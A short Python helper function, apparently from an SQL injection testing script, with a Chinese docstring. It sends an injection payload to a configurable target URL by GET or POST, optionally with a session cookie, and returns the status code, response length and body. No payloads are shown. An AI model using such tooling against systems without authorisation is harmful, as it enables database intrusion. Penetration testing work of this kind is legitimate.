def send_payload(payload):
    """发送 SQL 注入 payload 并返回响应。"""
    params = {PARAMETER: payload}
    headers = {"Cookie": COOKIE} if COOKIE else {}

    if METHOD.upper() == "POST":
        resp = requests.post(TARGET, data=params, headers=headers, timeout=10)
    else:
        resp = requests.get(TARGET, params=params, headers=headers, timeout=10)

    return {
        "status": resp.status_code,
        "length": len(resp.text),
        "text": resp.text,
    }


